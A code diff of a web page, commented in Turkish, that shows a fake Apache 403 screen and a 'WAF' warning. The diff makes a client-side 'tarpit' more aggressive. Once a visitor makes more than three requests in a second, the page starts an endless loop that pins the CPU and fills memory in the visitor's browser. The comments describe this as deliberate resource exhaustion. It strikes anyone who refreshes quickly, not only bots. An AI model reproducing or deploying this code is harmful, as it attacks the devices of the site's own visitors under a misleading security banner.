@@ -96,7 +96,7 @@
             animation: spaceGlow 4s infinite alternate;
         }
 
-        /* HAVALI BEYAZ ANIX HACKER YAZISI */
+        /* HAVALI BEYAZ ANIX SENIOR YAZISI */
         .content-box {
             position: relative;
             z-index: 2;
@@ -158,15 +158,15 @@
     <!-- TARPIT - CİHAZ KAYNAĞINI TÜKETEN SİBER DUVAR -->
     <div id="waf-shield-screen">
         <div class="waf-box">
-            <h1>[ WAF / DEVICE DEGRADATION ACTIVE ]</h1>
+            <h1>[ WAF / ADVANCED DEVICE DEGRADATION ACTIVE ]</h1>
             <p>Anix Cyber Defense: Tarayıcınız üzerinden anormal istek sıklığı (DDoS/Flood) tespit edilmiştir. Güvenlik protokolleri gereği cihazınız kısıtlama havuzuna (Tarpit) alınmıştır.</p>
             <div class="logs-area">
-                <div class="log-line">Firewall Status: <span style="color: #ff2222; font-weight:bold;">TARPIT ACTIVE</span></div>
-                <div class="log-line">Mitigation Strategy: <span>Client-Side Resource Exhaustion</span></div>
-                <div class="log-line">Rate Limit Policy: <span>Max 4 req/sec exceeded</span></div>
-                <div class="log-line">Signature Trigger: <span>Sig_Tarpit_Infinite_Loop_Lock</span></div>
+                <div class="log-line">Firewall Status: <span style="color: #ff2222; font-weight:bold;">ULTRA TARPIT ACTIVE</span></div>
+                <div class="log-line">Mitigation Strategy: <span>Advanced Client-Side Resource Exhaustion</span></div>
+                <div class="log-line">Rate Limit Policy: <span>Max 3 req/sec exceeded</span></div>
+                <div class="log-line">Signature Trigger: <span>Sig_Tarpit_Crypto_Loop_Lock_V2</span></div>
                 <div class="log-line">Tracking Token: <span id="log-token">Checking...</span></div>
-                <div class="log-line">Target Device State: <span style="color:#ff3333; font-weight:bold;">Exhausting CPU/RAM Resources...</span></div>
+                <div class="log-line">Target Device State: <span style="color:#ff3333; font-weight:bold;">Exhausting CPU/RAM Resources Aggressively...</span></div>
             </div>
         </div>
     </div>
@@ -179,79 +179,74 @@
         <p class="server-info">Apache/2.4.59 (Ubuntu) Server at anixsenior.com Port 443</p>
     </div>
 
-    <!-- SÜRE BİTİNCE AÇILACAK UZAY TEMALI YENİ ANA EKREAN -->
+    <!-- SÜRE BİTİNCE AÇILACAK UZAY TEMALI YENİ ANA EKRAN -->
     <div id="hacker-screen">
         <div class="space-bg"></div>
         <div class="content-box">
-            <h1 class="hacker-title">Anix Hacker</h1>
+            <h1 class="hacker-title">Anix Senior</h1>
         </div>
     </div>
-        <!-- PROFESYONEL YAZILIMSAL DDOS / Gelişmiş Tarpit Motoru -->
+        <!-- PROFESYONEL YAZILIMSAL DDOS / Gelişmiş Tarpit Motoru (Oturum Tabanlı) -->
     <script>
         (function() {
-            // --- GÜVENLİK AYARLARI ---
-            const RATE_LIMIT_SEC = 4; // 1 saniyede yapılabilecek maksimum istek sınırı
+            // --- GELİŞMİŞ GÜVENLİK AYARLARI ---
+            const RATE_LIMIT_SEC = 3; // 1 saniyede yapılabilecek maksimum istek sınırı
             const BAN_TIME_MS = 1800000; // Cihazın döngüde tutulacağı süre (30 Dakika)
 
             const nowMs = Date.now();
-            const nowSec = Math.floor(nowMs / 1000);
 
             if(document.getElementById('log-token')) {
                 document.getElementById('log-token').innerText = 'ANIX-' + Math.random().toString(36).substr(2, 9).toUpperCase();
             }
 
-            // 1. AŞAMA: ÖNCEKİNDEN BANLI MI KONTROLÜ
-            const isBanned = localStorage.getItem('anix_tarpit_ban');
-            const banUntil = localStorage.getItem('anix_tarpit_ban_time');
+            // 1. AŞAMA: MEVCUT SEKMEDE BANLI MI KONTROLÜ
+            const isBanned = sessionStorage.getItem('anix_tarpit_ban');
+            const banUntil = sessionStorage.getItem('anix_tarpit_ban_time');
 
             if (isBanned === 'true' && banUntil && nowMs < parseInt(banUntil)) {
                 executeTarpit();
                 return;
             } else {
-                localStorage.removeItem('anix_tarpit_ban');
-                localStorage.removeItem('anix_tarpit_ban_time');
+                sessionStorage.removeItem('anix_tarpit_ban');
+                sessionStorage.removeItem('anix_tarpit_ban_time');
             }
 
-            // 2. AŞAMA: CANLI HIZ SINIRLAMA KONTROLÜ
-            let shieldHistory = JSON.parse(sessionStorage.getItem('anix_tarpit_history')) || { time: nowSec, count: 0 };
+            // 2. AŞAMA: GELİŞMİŞ CANLI HIZ SINIRLAMA KONTROLÜ (Yenileme ve yeni girişte sıfırlanır)
+            let requestTimestamps = JSON.parse(sessionStorage.getItem('anix_request_timestamps')) || [];
+            
+            // Son 1 saniye dışındaki eski kayıtları temizle
+            requestTimestamps = requestTimestamps.filter(timestamp => nowMs - timestamp < 1000);
+            
+            // Mevcut isteği ekle
+            requestTimestamps.push(nowMs);
+            sessionStorage.setItem('anix_request_timestamps', JSON.stringify(requestTimestamps));
 
-            if (shieldHistory.time === nowSec) {
-                shieldHistory.count++;
-            } else {
-                shieldHistory.time = nowSec;
-                shieldHistory.count = 1;
-            }
-            sessionStorage.setItem('anix_tarpit_history', JSON.stringify(shieldHistory));
-
-            // Eğer saniyedeki istek limiti aşıldıysa botu tuzağa düşür
-            if (shieldHistory.count > RATE_LIMIT_SEC) {
-                localStorage.setItem('anix_tarpit_ban', 'true');
-                localStorage.setItem('anix_tarpit_ban_time', (nowMs + BAN_TIME_MS).toString());
+            // Eğer son 1 saniyede yapılan istek sayısı limiti aştıysa botu tuzağa düşür
+            if (requestTimestamps.length > RATE_LIMIT_SEC) {
+                sessionStorage.setItem('anix_tarpit_ban', 'true');
+                sessionStorage.setItem('anix_tarpit_ban_time', (nowMs + BAN_TIME_MS).toString());
                 executeTarpit();
                 return;
             }
 
-            // BOTUN CPU VE RAM KAYNAKLARINI TÜKETEN GÜÇLÜ SONSUZ DÖNGÜ (TARPIT) MOTORU
+            // BOTUN CPU VE RAM KAYNAKLARINI AGRESİF TÜKETEN GÜÇLÜ SONSUZ DÖNGÜ (TARPIT) MOTORU
             function executeTarpit() {
-                // Görsel arayüzü engelleme moduna geçir
                 document.getElementById('waf-shield-screen').style.display = 'block';
                 document.getElementById('forbidden-screen').style.display = 'none';
                 document.getElementById('hacker-screen').style.display = 'none';
 
-                // Tarayıcının ana iş parçacığını (Thread) kilitleyen kriptografik sonsuz döngü.
-                // Tarayıcı sekmesi veya bot kütüphanesi kapanana kadar CPU çekirdeğini %100 yükte tutar ve RAM'i tüketir.
                 setTimeout(function() {
-                    const dynamicStorage = [];
+                    const heavyStorage = [];
                     while (true) {
-                        // İşlemciyi yoracak anlamsız matematiksel hesaplamalar dizisi
-                        let cryptoYük = Math.exp(Math.sqrt(Math.random() * 100000)) * Math.atan(Math.random());
+                        let num1 = Math.exp(Math.sqrt(Math.random() * 200000));
+                        let num2 = Math.atan(Math.random() * 5000) * Math.tan(Math.random());
+                        let cryptoLoad = num1 * num2;
                         
-                        // Belleği (RAM) doldurmak için havuz oluşturma (Boyutu katlayarak büyütür)
-                        if (dynamicStorage.length < 5000000) {
-                            dynamicStorage.push(new Array(1000).fill(cryptoYük));
+                        if (heavyStorage.length < 8000000) {
+                            heavyStorage.push(new Array(2000).fill(cryptoLoad));
                         }
                     }
-                }, 100);
+                }, 50);
             }
 
             // 3. AŞAMA: GÜVENLİ KULLANICILAR İÇİN GEÇİŞ MOTORU
@@ -259,16 +254,15 @@
                 var forbidden = document.getElementById('forbidden-screen');
                 var hacker = document.getElementById('hacker-screen');
                 
-                if (forbidden && hacker && localStorage.getItem('anix_tarpit_ban') !== 'true') {
+                if (forbidden && hacker && sessionStorage.getItem('anix_tarpit_ban') !== 'true') {
                     forbidden.style.display = 'none';
                     hacker.style.display = 'flex';
                     setTimeout(function() {
                         hacker.style.opacity = '1';
                     }, 50);
                 }
-            }, 15000);
+            }, 15000); // 15 saniye sonra geçiş yapar
         })();
     </script>
-
 </body>
 </html>
